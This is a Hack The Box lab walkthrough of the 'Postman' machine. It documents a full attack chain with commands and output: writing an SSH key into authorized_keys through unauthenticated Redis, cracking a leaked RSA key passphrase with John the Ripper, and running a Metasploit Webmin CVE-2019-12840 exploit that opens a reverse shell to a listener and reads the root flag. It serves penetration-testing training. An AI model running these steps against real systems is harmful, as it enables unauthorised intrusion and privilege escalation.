---
title: 'HTB Postman: Complete Evidence-Led Walkthrough'
description: Unprotected Redis persistence enabled an SSH foothold, which led to weak private-key recovery and authenticated Webmin code execution.
date: 2026-11-12
category: Linux / Web Security
difficulty: Not recorded
tags:
- Hack The Box
- Linux
- Redis
- SSH
- John the Ripper
- Webmin
- CVE-2019-12840
published: true
slug: htb-postman
---

# Overview

**Machine:** Postman  
**Platform:** Hack The Box  
**Publication format:** htb-postman.md  

The lab combined an externally accessible Redis instance with a separate authenticated administrative web service. The compromise path depended on chaining them through local account exposure.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

> **Enkidu's Field Notes | CPTS Prep Boxes | Full Technical Walkthrough**  
> **Engagement date:** 23 October 2026  
> **Target:** `10.129.2.1`  
> **Hostname:** `Postman`  
> **Operating system:** Ubuntu 18.04.3 LTS, kernel `4.15.0-58-generic`  
> **Outcome:** Root flag retrieved  
> **Methodology:** Black-box enumeration → access validation → local credential recovery → authenticated application exploitation  
> **Evidence rule:** Statements marked *Observed* come from the recorded terminal output. Reproduction steps recorded in the conversation but not accompanied by complete command output are marked *reconstructed* where appropriate.

---

### Executive Summary

Postman was compromised through a chained series of weaknesses rather than a single unauthenticated root exploit. Initial reconnaissance exposed Redis 4.0.9 on TCP/6379, an Apache personal website on TCP/80, SSH on TCP/22, and Webmin 1.910 on TCP/10000. Redis accepted unauthenticated commands, allowed its persistence directory and database filename to be changed, and successfully wrote an RDB snapshot inside the Redis account's `.ssh` directory. Placing an SSH public key inside the Redis database and saving it to the SSH authorization filename enabled a successful SSH login as `redis`.

Local history and filesystem enumeration revealed an encrypted RSA private key, `/opt/id_rsa.bak`, owned by `Matt` but readable by other users. John the Ripper recovered the passphrase `[REDACTED]` using `rockyou.txt`. The engagement then transitioned to the `Matt` account through local `su`, bypassing an SSH daemon configuration that explicitly denied direct SSH access for Matt. The recovered credential was subsequently used to authenticate to the Webmin administration interface.

An initial Webmin password-change backdoor attempt failed its Metasploit vulnerability check. Rather than forcing it, the assessment switched to a different, authenticated vulnerability: Webmin Package Updates command execution, **CVE-2019-12840**. Metasploit successfully authenticated and opened a reverse command shell. The shell was able to retrieve `/root/root.txt`, completing the objective.

**Important verification boundary:** The recording contains the successful root flag read, but does not contain `id` or `whoami` from inside the final Metasploit shell. The report therefore claims **verified root-flag access** and **successful privileged RCE exploitation consistent with the module**, rather than inventing a separately captured `uid=0` proof.

#### Attack chain at a glance

```text
10.129.2.1 - Postman
    |
    +-- 6379/tcp: Redis 4.0.9, unauthenticated
    |       |
    |       +-- CONFIG SET dir/dbfilename permitted
    |       +-- SAVE writes inside /var/lib/redis/.ssh
    |       +-- RDB containing attacker SSH public key -> authorized_keys
    |       +-- SSH as redis (uid=107)  [VERIFIED]
    |               |
    |               +-- Shell history: repeated `su Matt`, reference to id_rsa.bak
    |               +-- /opt/id_rsa.bak: encrypted RSA key, world-readable
    |               +-- ssh2john + John -> [REDACTED]
    |               +-- su -> Matt (uid=1000)  [VERIFIED ACCOUNT TRANSITION]
    |                       |
    +-- 10000/tcp: Webmin 1.910 (MiniServ)
                            |
                            +-- PAM-based local auth; Matt login successful
                            +-- CVE-2019-15107 backdoor: rejected by check
                            +-- CVE-2019-12840 Package Updates RCE
                            +-- Metasploit command shell opened
                            +-- /root/root.txt read  [VERIFIED]
```

#### Evidence-based finding register

| ID | Finding | Evidence | Consequence |
|---|---|---|---|
| F-01 | Redis unauthenticated and reachable remotely | `PING → PONG`; `INFO server`; `requirepass` empty; `protected-mode=no` | Untrusted client could issue administrative Redis commands |
| F-02 | Redis persistence path and filename controllable | `CONFIG SET dir` and `dbfilename` returned `OK`; `SAVE` succeeded in `.ssh` | Writable RDB snapshot file under Redis account |
| F-03 | SSH trust file injection via Redis | SSH as `redis` succeeded using attacker-generated Ed25519 key | Initial foothold, `uid=107(redis)` |
| F-04 | Sensitive encrypted RSA private key readable to other users | `/opt/id_rsa.bak` permissions `-rwxr-xr-x`, owner `Matt` | Offline passphrase cracking possible |
| F-05 | Weak/reused passphrase permits user transition | John recovered `[REDACTED]`; `Matt@Postman` shell subsequently observed | Lateral movement from service account to Matt |
| F-06 | Webmin privileged command execution for authenticated Package Updates user | Webmin 1.910; root-owned MiniServ process; Metasploit shell opened after authenticated exploit | Execution path to root-owned application process |
| F-07 | Root flag exposed through final shell | `cat /root/root.txt` returned flag value | Objective achieved |

---

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Scope, Tooling and Evidence Conventions

#### Scope

- **Authorized lab target:** `10.129.2.1` (HTB Postman)
- **Attacking host:** Parrot Linux, with an observed reverse-shell listener at `10.10.15.31`
- **Account progression:** unauthenticated → `redis` → `Matt` → Webmin command shell
- **Primary tools:** Nmap, WhatWeb, curl, `redis-cli`, OpenSSH, SCP, John the Ripper, LinPEAS, Metasploit Framework
- **No network pivot required:** this was a single-host attack chain, so Ligolo-ng was not needed.

#### Notation

```bash
export IP=10.129.2.1
```

Commands tagged **[Parrot]** run on the attacking machine. Commands tagged **[Postman:redis]** or **[Postman:Matt]** run on the target. `$IP` in Parrot snippets means `10.129.2.1`; don't assume that variable exists in the target user's environment.

Sensitive artifacts, even in a lab, should be treated as credentials: `postman_key` and `id_rsa.bak` require restrictive permissions and should not be published to a public repository with live private material. The passphrase and CTF flag appear in this record as observed lab results.

---

### Reconnaissance

#### Full TCP port scan

**[Parrot]**

```bash
sudo nmap -Pn -sS -p- --min-rate 1000 \
  --open -oA scans/full-tcp "$IP"
```

**Observed:**

```text
Nmap scan report for 10.129.2.1
Host is up (0.28s latency).
Not shown: 62231 closed tcp ports (reset), 3300 filtered tcp ports (no-response)

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
```

The `snet-sensor-mgmt` label was only Nmap's initial port-name mapping. Service identification later established that TCP/10000 was **Webmin**, not an unrelated sensor application. The scan was fairly aggressive (`--min-rate 1000`); the reported filtered/closed categories may be influenced by rate limiting. A service scan was therefore necessary.

#### Service and default-script scan

**[Parrot]**

```bash
sudo nmap -Pn -sC -sV --version-all \
  -p22,80,6379,10000 \
  -oA scans/services "$IP"
```

**Observed:**

| Port | Service | Version and notes |
|---|---|---|
| 22/tcp | SSH | OpenSSH `7.6p1 Ubuntu 4ubuntu0.3` |
| 80/tcp | HTTP | Apache `2.4.29 (Ubuntu)`; title **The Cyber Geek's Personal Website** |
| 6379/tcp | Redis | Redis key-value store `4.0.9` |
| 10000/tcp | HTTP | `MiniServ/1.910` - Webmin |

**Priority decision:** Redis and Webmin warranted immediate investigation. An exposed key-value store may permit unauthenticated administration; a Webmin instance is a particularly sensitive management surface.

#### Web reconnaissance

**[Parrot]**

```bash
whatweb http://"$IP"
whatweb http://"$IP":10000
whatweb https://"$IP":10000

curl -sI http://"$IP"
curl -sI http://"$IP":10000
curl -ksI https://"$IP":10000
```

**Observed:**

- Port 80 returned `200 OK`, Apache/2.4.29, Bootstrap, jQuery, HTML5, and the personal-site title.
- Port 10000 returned a `MiniServ/1.910` banner and a Webmin login interface.
- Curl's HTTPS HEAD request exposed Webmin-related cookies and headers; one WhatWeb HTTPS probe showed an SSL read error. Subsequent browser authentication established that the management application was reachable.
- No exploitable finding was confirmed from the personal website.

**Lesson:** Don't mistake a port-number service label for an actual fingerprint. Record both application version and access path.

---

## Analysis

Redis permitted remote configuration of its persistence directory and filename. Writing a database snapshot to the redis account's SSH key-authorization path yielded an SSH foothold. Enumeration then uncovered an encrypted RSA key whose passphrase was in a common wordlist. Although the Webmin backdoor check failed, authenticated Webmin Package Updates exploitation succeeded and yielded root-flag access.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Initial Access: Redis to SSH

#### Verify unauthenticated Redis access

**[Parrot]**

```bash
redis-cli -h "$IP" -p 6379 PING
redis-cli -h "$IP" -p 6379 INFO server
```

**Observed:**

```text
PONG

# Server
redis_version:4.0.9
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
process_id:661
tcp_port:6379
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```

This confirmed that **Redis commands were accepted without authentication** and that the Redis daemon ran locally from `/usr/bin/redis-server`.

#### Inspect database content and security settings

**[Parrot]**

```bash
redis-cli -h "$IP" INFO keyspace
redis-cli -h "$IP" DBSIZE
redis-cli -h "$IP" --scan

redis-cli -h "$IP" CONFIG GET dir
redis-cli -h "$IP" CONFIG GET dbfilename
redis-cli -h "$IP" CONFIG GET protected-mode
redis-cli -h "$IP" CONFIG GET requirepass
```

**Observed:**

```text
DBSIZE               -> 0
--scan               -> (no keys)
dir                  -> /var/lib/redis
dbfilename           -> dump.rdb
protected-mode       -> no
requirepass          -> (empty)
```

The empty database did **not** eliminate Redis as an attack surface. Redis can save database snapshots to disk; the next question was whether an unauthenticated client could influence their filesystem path.

#### Validate configuration control

**[Parrot]**

```bash
redis-cli -h "$IP" CONFIG SET dir /tmp
redis-cli -h "$IP" CONFIG GET dir
```

**Observed:**

```text
OK
1) "dir"
2) "/tmp"
```

The working-directory setting was then restored during this test:

```bash
redis-cli -h "$IP" CONFIG SET dir /var/lib/redis
# OK
```

Persistence settings also showed that RDB snapshots were enabled and AOF was disabled:

```bash
redis-cli -h "$IP" INFO persistence
redis-cli -h "$IP" CONFIG GET appendonly
redis-cli -h "$IP" CONFIG GET save
```

**Observed:**

```text
appendonly -> no
save       -> 900 1 300 10 60 10000
rdb_last_bgsave_status:ok
```

##### Why this mattered

- `dir` determines where Redis attempts to write RDB data.
- `dbfilename` chooses the output filename.
- `SAVE` triggers a snapshot.
- The write runs with the Redis process's operating-system permissions, **not** root by default.

This is a **constrained file-write primitive**: Redis writes an RDB-formatted file, not an arbitrary clean text file.

#### Prove an actual write before exploitation

**[Parrot]**

```bash
redis-cli -h "$IP" CONFIG SET dir /tmp
redis-cli -h "$IP" CONFIG SET dbfilename enkidu-test.rdb
redis-cli -h "$IP" SET enkidu_test "redis_write_verified"
redis-cli -h "$IP" SAVE
```

**Observed:**

```text
OK
OK
OK
OK
rdb_last_save_time:1792769622
rdb_last_bgsave_status:ok
```

Restore the original settings after the test:

```bash
redis-cli -h "$IP" DEL enkidu_test
redis-cli -h "$IP" CONFIG SET dbfilename dump.rdb
redis-cli -h "$IP" CONFIG SET dir /var/lib/redis
```

**Observed:** deletion returned `(integer) 1`, and both configuration restorations returned `OK`.

**Why the test mattered:** We ruled out a dead-end where `CONFIG SET` succeeds but persistence cannot actually write to the chosen destination.

#### Test the Redis user's SSH directory

**[Parrot]**

```bash
redis-cli -h "$IP" CONFIG SET dir /var/lib/redis/.ssh
# OK
redis-cli -h "$IP" CONFIG SET dir /var/lib/redis
# OK
```

Redis accepted the `.ssh` destination. That alone did not prove write permission, so a second non-production snapshot was used:

```bash
redis-cli -h "$IP" CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h "$IP" CONFIG SET dbfilename .enkidu-test.rdb
redis-cli -h "$IP" SET write_test "enkidu"
redis-cli -h "$IP" SAVE
```

**Observed:** All four commands returned `OK`.

This demonstrated that Redis could create an RDB snapshot **inside the SSH configuration directory**. The output path for this test was:

```text
/var/lib/redis/.ssh/.enkidu-test.rdb
```

#### Generate an SSH keypair

**[Parrot]**

```bash
ssh-keygen -t ed25519 -f ./postman_key -N ''
```

**Observed:**

```text
Your identification has been saved in ./postman_key
Your public key has been saved in ./postman_key.pub
SHA256:iuawudC2tiUXVTSIsKnouc3vMJPK6pV9GYlz+Mj0Z/w enkidu@parrot
```

- `postman_key` is the private key (keep it private).
- `postman_key.pub` is the public key to be authorized on the target.
- `-N ''` generates the lab key without a passphrase.

#### Construct the RDB-to-SSH trust-file payload

**[Reconstructed from the execution instructions and subsequent successful SSH proof; the intermediate SET/SAVE output was not separately pasted.]**

**[Parrot]**

```bash
{
  printf '\n\n'
  cat postman_key.pub
  printf '\n\n'
} > redis_payload.txt

redis-cli -h "$IP" -x SET ssh_pubkey < redis_payload.txt
```

`redis-cli -x` reads the value directly from standard input. The newline padding is important because the actual database snapshot contains binary RDB metadata. The goal was to position the SSH public key on a distinct line that OpenSSH's `authorized_keys` parser could recognize, despite the surrounding snapshot bytes.

**[Parrot]**

```bash
redis-cli -h "$IP" CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h "$IP" CONFIG SET dbfilename authorized_keys
redis-cli -h "$IP" SAVE
```

This directed Redis to save its RDB data as the SSH account's usual authorization filename:

```text
/var/lib/redis/.ssh/authorized_keys
```

**Crucial caveat:** `SAVE` can replace an existing file with the configured filename. In a real assessment, back up and evaluate the impact before touching a trust file. This was an authorized HTB lab.

#### SSH authentication succeeds

**[Parrot]**

```bash
chmod 600 postman_key
ssh -i ./postman_key -o IdentitiesOnly=yes redis@"$IP"
```

**Observed:**

```text
Welcome to Ubuntu 18.04.3 LTS
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

**Result: INITIAL FOOTHOLD CONFIRMED.**

The key difference between a theoretical Redis exploit and a verified exploit is this final SSH proof. Redis write success alone did not establish that OpenSSH would parse or accept the generated file; successful authentication did.

---

### Post-Exploitation Enumeration: redis to Matt

#### Identify interactive accounts

**[Postman:redis]**

```bash
cat /etc/passwd | grep -E '/bin/(bash|sh)$'
```

**Observed:**

```text
root:x:0:0:root:/root:/bin/bash
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```

The only normal interactive user was `Matt` (capital M). That made Matt the most valuable identity to investigate for lateral movement.

#### Shell history reveals a specific credential lead

**[Postman:redis]**

```bash
cat ~/.bash_history
```

**Relevant observed lines:**

```text
su Matt
su Matt
su Matt
cat id_rsa.bak
cat id_rsa.bak
cat /etc/ssh/sshd_config
```

History was an important navigation aid. Instead of searching the entire filesystem blindly, it produced two highly specific questions:

1. Why had this account repeatedly attempted `su Matt`?
2. Where was the `id_rsa.bak` private key that the account had tried to inspect?

#### SSH access to Matt explicitly disabled

**[Postman:redis]**

```bash
cat /etc/ssh/sshd_config
```

**Relevant observed lines:**

```text
PermitRootLogin yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
PasswordAuthentication yes
DenyUsers Matt
```

`DenyUsers Matt` is an SSH daemon policy, not a universal account lock. It can block a direct SSH connection as Matt while leaving local account switching via `su` unaffected.

**Decision:** Don't waste time attempting direct SSH authentication for Matt while `DenyUsers` is active. Look for valid local credentials, then use the shell already obtained.

#### Discover the leaked RSA private key

The initial attempt to read `id_rsa.bak` from Redis's current directory failed. A targeted inspection of `/opt` found the file:

**[Postman:redis]**

```bash
ls -lah /opt
cat /opt/id_rsa.bak
```

**Observed:**

```text
-rwxr-xr-x 1 Matt Matt 1.8K Aug 26 2019 id_rsa.bak
```

And the file began:

```text
-----BEGIN RSA PRIVATE KEY-----
[REDACTED_KEY_OR_CERTIFICATE_MATERIAL]
-----END RSA PRIVATE KEY-----
```

**Interpretation:**

- The RSA private key was encrypted with a passphrase.
- The owner was `Matt`.
- Permissions `755` allowed **any local user to read the private key**, notwithstanding that it belonged to a different account.
- The ability to read an encrypted key is not the same as immediately authenticating with it. An offline passphrase recovery step was needed.

**Important:** These permissions are inappropriate for a private key. Owner-only read (`0600`) would have blocked the `redis` account from reading it.

#### Transfer and crack the key

**[Parrot]**

```bash
scp -i ./postman_key \
  redis@"$IP":/opt/id_rsa.bak \
  ./id_rsa.bak

chmod 600 id_rsa.bak
python3 /usr/share/john/ssh2john.py id_rsa.bak > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
john --show ssh.hash
```

**Observed John output:**

```text
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1
Cost 2 (iteration count) is 2
Will run 8 OpenMP threads
[REDACTED]     (id_rsa.bak)
1g 0:00:00:00 DONE
```

**Recovered passphrase:** `[REDACTED]``

**Why it worked:** The key was readable to a low-privilege account, and its encryption passphrase was present in a common password wordlist. This is an excellent example of chaining **poor file permissions** with **weak secret selection**.

> **CPTS wordlist lesson:** Start with relevant high-value lists such as RockYou, but do not declare a credential uncrackable after a short list fails. Escalate to longer lists, rules, and contextual candidates as warranted. Here, RockYou succeeded quickly.

#### Move to Matt with local account switching

**[Postman:redis]**

```bash
su - Matt
```

The session later showed:

```text
Matt@Postman:~$
```

This confirms the **Matt identity transition**. The workflow tested the recovered string as Matt's password; interactive password input itself is naturally not echoed in the captured shell. The sequence is consistent with passphrase/password reuse.

**Why direct SSH was unnecessary:** The `DenyUsers Matt` rule applied to SSH login attempts, not to successful local `su` authentication from the Redis foothold.

---

### Local Enumeration as Matt

#### Matt's shell history

**[Postman:Matt]**

```bash
cat ~/.bash_history
```

**High-signal observed commands:**

```text
sudo -l
su root
python -m SimpleHTTPPutServer 8080
python3 server/server.py
nano server/reminder
nano justincase.txt
openssl genrsa -des3 -out private.pem 2048
mv private.pem server/id_rsa.bak
chmod u+s base64
crontab -e
crontab -r
```

Several traces were interesting but were **not automatically exploitable**:

- Matt experimented with a writable HTTP PUT server.
- Matt repeatedly attempted `su root`.
- The history showed an attempt to make a `base64` file SUID, but **history does not demonstrate that a useful root-owned SUID file still exists**.
- Cron entries were edited and later removed; no usable root cron hijack was confirmed.
- The filenames `reminder` and `justincase.txt` were promising, but their contents were not captured in this engagement transcript. Don't invent what they contained.

#### Custom HTTP PUT server

**[Postman:Matt]**

```bash
cat /var/www/SimpleHTTPPutServer.py
```

**Observed code (abridged only by removing the launcher comment):**

```python
import SimpleHTTPServer
import BaseHTTPServer

class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_PUT(self):
        print self.headers
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))

if __name__ == '__main__':
    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```

**Security implications:** No upload authentication, overwrite protection, or content validation were implemented by this handler. However, a file-writing web server can write only where its **process identity** has permission. This script belonged to Matt; the engagement did not establish that it was running with root privileges. It was recorded as an interesting artifact, **not** used for escalation.

#### Sudo and SUID assessment

The user reported **no useful `sudo -l` privileges**. The earlier Redis-level SUID enumeration showed conventional binaries such as `/usr/bin/sudo`, `/usr/bin/passwd`, `/bin/su`, `/bin/mount`, and `/bin/ping`.

The history's `chmod u+s base64` line was worth checking, but no root-owned SUID `base64` executable was shown to exist in the current state.

**Lesson:** A command appearing in history is a *lead*, not evidence of a currently exploitable misconfiguration.

#### Run LinPEAS without executable permissions

LinPEAS was transferred to `/tmp` under the Redis account:

```text
-rw-rw-r-- 1 redis redis 1.8M linpeas.sh
```

As Matt, `chmod +x /tmp/linpeas.sh` failed with `Operation not permitted` because Matt was not the file owner.

**[Postman:Matt]**

```bash
bash /tmp/linpeas.sh | tee /tmp/linpeas-output.txt
```

**Lesson:** A script doesn't need its executable bit set if the interpreter can read it. The real issue was **file ownership**, not execution policy.

#### LinPEAS findings and triage

LinPEAS confirmed:

```text
OS: Linux version 4.15.0-58-generic
User: uid=1000(Matt) gid=1000(Matt)
Ubuntu 18.04.3 LTS
Webmin root process: /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

The LinPEAS output contained several kernel-local-privilege-escalation candidates, including a reported AF_ALG/splice write-condition check and OVS/ESP prerequisites. These were **automated findings**, not independently exploited or validated to root in this engagement. In particular, merely matching a CVE's kernel-version range or kernel-module prerequisites does not establish reliable exploitability; vendor fixes, packaging, and exact kernel builds matter.

LinPEAS also showed:

- Standard-looking cron/timer/service entries, without a verified writable root execution path.
- `sudo` version `1.8.21p2`, but no demonstrated sudo rule granting Matt privileges.
- Active `webmin.service` and a root-owned MiniServ process.
- A separate Redis tooling/version display reporting `v=5.0.0`, while **Redis `INFO server` and Nmap both fingerprinted the running server as `4.0.9`**. Trust the actual server fingerprint for the target Redis daemon rather than conflating it with an installed client/tool version.

**Prioritization decision:** Pursue an authenticated management application running as root before risking kernel instability with a speculative exploit.

---

### Privilege Escalation: Authenticated Webmin RCE

#### Establish Webmin identity and privileged process context

External reconnaissance fingerprinted:

```text
10000/tcp open http MiniServ 1.910 (Webmin httpd)
```

The target process listing showed:

```text
root 768 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

**[Postman:Matt]**

```bash
cat /etc/pam.d/webmin
```

**Observed:**

```text
#%PAM-1.0
@include common-auth
@include common-account
@include common-password
@include common-session
```

This established that Webmin was configured to use the system's PAM stack. It **did not by itself guarantee** that Matt had permission to log into Webmin or access privileged modules.

#### Authenticate to Webmin

**[Browser on Parrot]**

```text
https://10.129.2.1:10000
Username: Matt
Password: [REDACTED]
```

The first reported attempt was unsuccessful; a subsequent attempt **succeeded**, and a screenshot confirmed the authenticated Webmin 1.910 dashboard as Matt. The reason for the initially failed login was not recorded. Do not invent a configuration change or typo to explain it.

**Result: Authenticated Webmin access confirmed.**

#### Enumerate Metasploit's Webmin modules

**[Parrot]**

```text
msfconsole -q
search webmin
```

The visible results included:

```text
exploit/unix/webapp/webmin_show_cgi_exec
exploit/linux/http/webmin_file_manager_rce
exploit/linux/http/webmin_package_updates_rce
exploit/linux/http/webmin_packageup_rce
exploit/unix/webapp/webmin_upload_exec
exploit/linux/http/webmin_backdoor
```

**Avoid similarly named-module confusion:**

- `webmin_packageup_rce` is the **2019** authenticated Package Updates issue used in this session (CVE-2019-12840).
- `webmin_package_updates_rce` is a **different** later Package Updates issue (CVE-2022-36446).
- `webmin_backdoor` is the password-change backdoor issue (CVE-2019-15107), which **did not succeed** in this engagement.

The precise module name is important for repeatable reporting.

#### Failed path: Webmin password-change backdoor

**[Parrot: Metasploit]**

```text
use exploit/linux/http/webmin_backdoor
set RHOSTS 10.129.2.1
set RPORT 10000
set SSL true
run
```

**Observed:**

```text
[*] Started reverse TCP handler on 10.10.15.31:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: not-vulnerable:
    The target is not exploitable. Version 1.910 is not vulnerable
[*] Exploit completed, but no session was created.
```

**Interpretation:** Metasploit's check rejected this specific exploitation route. The target's `1.910` version alone was insufficient to prove the backdoor was enabled and exploitable. The session did **not** force exploitation or claim that the backdoor worked.

**Good decision:** Back out rather than set `ForceExploit true` with no supporting evidence.

#### Successful path: Package Updates command execution

**Vulnerability:** CVE-2019-12840  
**Affected component:** Webmin Package Updates, `update.cgi` handling of the `data` parameter  
**Prerequisite:** Valid authenticated account with authorization to the Package Updates module  
**Impact:** Arbitrary command execution as root within the vulnerable Webmin functionality  
**Recorded tool:** `exploit/linux/http/webmin_packageup_rce`

Rapid7's module documentation and the CVE description state that Webmin **through 1.910** can permit arbitrary root-level commands to an account authorized for the Package Updates module. The exploit's success in this assessment provides additional target-specific evidence that the relevant application path was reachable.

**[Parrot: Metasploit]**

```text
back
use exploit/linux/http/webmin_packageup_rce
set RHOSTS 10.129.2.1
set RPORT 10000
set SSL true
set USERNAME Matt
set PASSWORD [REDACTED]
set LHOST 10.10.15.31
show options
check
```

The `check` operation was interrupted manually (`^C`) and therefore returned **no useful affirmative vulnerability verdict**. The exploit was subsequently run:

```text
run
```

**Observed successful execution:**

```text
[*] Started reverse TCP handler on 10.10.15.31:4444
[+] Session cookie: [REDACTED_HEX]
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.15.31:4444 -> 10.129.2.1:41864)
    at 2026-10-23 22:01:30 +0530
```

**Result: A command shell was opened by the authenticated Webmin Package Updates exploit.**

The exposed Webmin session cookie is an authentication artifact; it is reproduced here only because it was visible in the lab transcript. For any published/non-lab report, mask active session tokens.

#### Root flag capture

**[Final command shell]**

```bash
cat /root/root.txt
```

**Observed:**

```text
[REDACTED_HEX]
```

**Result: ROOT FLAG CAPTURED.**

The final shell's UID was not captured in the visible evidence; to complete an ideal proof set on a future run, also execute:

```bash
id
whoami
hostname
ls -l /root/root.txt
```

This distinction does not negate the flag capture; it simply keeps the report faithful to recorded proof.

---

### Failed Leads, False Positives and Rabbit-Hole Control

| Lead | Observation | Decision | Methodology lesson |
|---|---|---|---|
| Empty Redis database | `DBSIZE = 0`, scan returned no keys | Investigate administrative features instead of stored records | An empty datastore can still be exploitable |
| Uncertain Redis filesystem write | `CONFIG SET dir` worked | Prove with a harmless `SAVE` | Validate each primitive before weaponizing it |
| `id_rsa.bak` missing from current directory | `cat id_rsa.bak` failed | Locate `/opt/id_rsa.bak` | Follow the filename clue; avoid assuming location |
| Direct SSH as Matt | `DenyUsers Matt` | Use local `su` once credential available | Understand the scope of an access-control rule |
| Custom HTTP PUT server | Writable handler was present | No privileged process execution shown | File-writing bugs need a useful execution context |
| `chmod u+s base64` in history | Historical command only | No current root-owned SUID candidate verified | History provides leads, not present-state proof |
| Cron editing in history | Jobs repeatedly edited and removed | No exploitable cron path established | Check actual schedule and file ownership |
| Sudo | No useful Matt sudo permission reported | Deprioritize | No privilege without an effective rule |
| LinPEAS kernel candidates | Conditions matched for several CVEs | Keep as fallback | Avoid unstable kernel exploits where a safer app path exists |
| Webmin backdoor | Metasploit auto-check rejected | Do not force | Same software version can expose different vulnerabilities |
| Webmin Package Updates | Authenticated exploit opened shell | Pursue, verify result | Changing the exploit hypothesis saved time |

#### Why the Webmin choice was sound

There was a **proven authenticated session**, a **root-owned daemon**, a **specific vulnerable application module**, and a Metasploit exploit matching that module/version. Those are stronger, more actionable signals than an automated list of possible kernel vulnerabilities. Avoiding an unverified kernel exploit reduced the risk of crashing the box and losing the SSH foothold.

#### Why this attack was a chain, not one bug

No single local observation proved total compromise. The outcome depended on connecting separate pieces:

1. Remote Redis misconfiguration gave a filesystem write with `redis` permissions.
2. File placement at an SSH trust boundary enabled a `redis` shell.
3. A sensitive private key had weak filesystem permissions.
4. Its passphrase was recoverable offline.
5. Credentials allowed a transition to the normal user and Webmin authentication.
6. The authenticated Webmin Package Updates vulnerability crossed into the privileged service context.

That style of evidence-backed chaining is especially relevant to CPTS assessments.

---

### Key Commands - Condensed Operator Reference

> These are a **reconstruction of the successful chain**, not a claim that every step's intermediate output was archived. Use only on authorized lab targets.

#### Reconnaissance

```bash
export IP=10.129.2.1
sudo nmap -Pn -sS -p- --min-rate 1000 --open -oA scans/full-tcp "$IP"
sudo nmap -Pn -sC -sV --version-all -p22,80,6379,10000 -oA scans/services "$IP"
redis-cli -h "$IP" PING
redis-cli -h "$IP" INFO server
redis-cli -h "$IP" CONFIG GET dir
redis-cli -h "$IP" CONFIG GET dbfilename
```

#### Redis SSH authorization injection

```bash
ssh-keygen -t ed25519 -f ./postman_key -N ''
{ printf '\n\n'; cat postman_key.pub; printf '\n\n'; } > redis_payload.txt
redis-cli -h "$IP" -x SET ssh_pubkey < redis_payload.txt
redis-cli -h "$IP" CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h "$IP" CONFIG SET dbfilename authorized_keys
redis-cli -h "$IP" SAVE
chmod 600 postman_key
ssh -i ./postman_key -o IdentitiesOnly=yes redis@"$IP"
```

#### Local user transition

```bash
# On the redis shell:
cat ~/.bash_history
ls -lah /opt
cat /opt/id_rsa.bak

# On Parrot:
scp -i ./postman_key redis@"$IP":/opt/id_rsa.bak ./id_rsa.bak
chmod 600 id_rsa.bak
python3 /usr/share/john/ssh2john.py id_rsa.bak > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
john --show ssh.hash

# Back on Postman:
su - Matt
```

#### Authenticated Webmin exploitation

```text
msfconsole -q
use exploit/linux/http/webmin_packageup_rce
set RHOSTS 10.129.2.1
set RPORT 10000
set SSL true
set USERNAME Matt
set PASSWORD [REDACTED]
set LHOST 10.10.15.31
show options
run
```

The user's actual listener in the recorded run was TCP/4444. If recreating the lab in a different VPN session, obtain the current tunnel address rather than reusing `10.10.15.31` blindly.

---

### Artifact Handling and Lab Cleanup

#### Files/artifacts created or exposed

| Artifact | Location | State/handling |
|---|---|---|
| Nmap scans | `scans/full-tcp.*`, `scans/services.*` on Parrot | Keep as local evidence |
| Attacker SSH private key | `./postman_key` on Parrot | Keep private, `chmod 600` |
| Attacker SSH public key | `./postman_key.pub` | Used in Redis payload |
| Redis injection input | `./redis_payload.txt` | Contains public key padding |
| Redis test database | `/tmp/enkidu-test.rdb` | Created by test; no deletion captured |
| Redis SSH-directory test file | `/var/lib/redis/.ssh/.enkidu-test.rdb` | Created by test; no deletion captured |
| SSH authorization file | `/var/lib/redis/.ssh/authorized_keys` | Targeted by final RDB injection; may have replaced prior contents |
| Redis injected key/value | `ssh_pubkey` | In-memory state after injection not checked for cleanup |
| Matt key backup | `/opt/id_rsa.bak` on target | Original misconfigured artifact; don't modify as a cleanup shortcut |
| Crackable John hash | `./ssh.hash` on Parrot | Contains sensitive key-derived authentication material |
| LinPEAS | `/tmp/linpeas.sh` on target | 1.8 MB, owned by `redis` |
| LinPEAS output | `/tmp/linpeas-output.txt` on target | Owned by Matt; useful assessment evidence |
| Webmin Metasploit session cookie | Appeared in exploit output | Sensitive session material; redact in external reporting |

#### Cleanup caveat

The **test** Redis configuration was visibly restored during enumeration, but the **final** post-injection values of `dir` and `dbfilename` were not independently pasted after obtaining SSH access. A responsible cleanup pass should check them before restarting services or causing another snapshot:

```bash
redis-cli -h "$IP" CONFIG GET dir
redis-cli -h "$IP" CONFIG GET dbfilename
```

Expected original values:

```text
dir        /var/lib/redis
dbfilename dump.rdb
